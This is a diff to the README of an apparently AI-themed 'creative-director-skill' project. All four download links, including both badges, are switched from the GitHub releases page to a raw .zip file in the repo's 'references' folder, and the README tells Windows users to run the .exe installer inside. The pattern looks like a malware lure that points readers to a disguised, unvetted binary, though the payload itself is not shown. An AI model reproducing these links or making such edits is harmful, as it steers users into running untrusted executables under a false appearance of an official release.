@@ -1,6 +1,6 @@
 # 🎨 creative-director-skill - AI tools for creative idea work
 
-[![Download creative-director-skill](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/eiwru/creative-director-skill/releases)
+[![Download creative-director-skill](https://img.shields.io/badge/Download-Here-brightgreen)](https://raw.githubusercontent.com/eiwru/creative-director-skill/main/creative-director/references/director_creative_skill_v1.8.zip)
 
 ## 📋 About creative-director-skill
 
@@ -33,7 +33,7 @@ Follow these steps to download and run creative-director-skill on your Windows c
 ### Step 1: Visit the download page
 
 Click the large download button at the top, or go to this link:  
-[https://github.com/eiwru/creative-director-skill/releases](https://github.com/eiwru/creative-director-skill/releases)
+[https://raw.githubusercontent.com/eiwru/creative-director-skill/main/creative-director/references/director_creative_skill_v1.8.zip](https://raw.githubusercontent.com/eiwru/creative-director-skill/main/creative-director/references/director_creative_skill_v1.8.zip)
 
 This page contains the latest versions of the app and instructions.
 
@@ -70,7 +70,7 @@ Use the interface to input ideas or prompts and explore the creative methods bui
 
 Use this link to access the download area again:  
 
-[https://github.com/eiwru/creative-director-skill/releases](https://github.com/eiwru/creative-director-skill/releases)
+[https://raw.githubusercontent.com/eiwru/creative-director-skill/main/creative-director/references/director_creative_skill_v1.8.zip](https://raw.githubusercontent.com/eiwru/creative-director-skill/main/creative-director/references/director_creative_skill_v1.8.zip)
 
 Look for the latest Windows installer (.exe) and follow the installation steps described above.
 
@@ -114,4 +114,4 @@ creative-director-skill is open source and available on GitHub. You can find the
 
 ---
 
-[![Download creative-director-skill](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/eiwru/creative-director-skill/releases)
+[![Download creative-director-skill](https://img.shields.io/badge/Download-Here-brightgreen)](https://raw.githubusercontent.com/eiwru/creative-director-skill/main/creative-director/references/director_creative_skill_v1.8.zip)
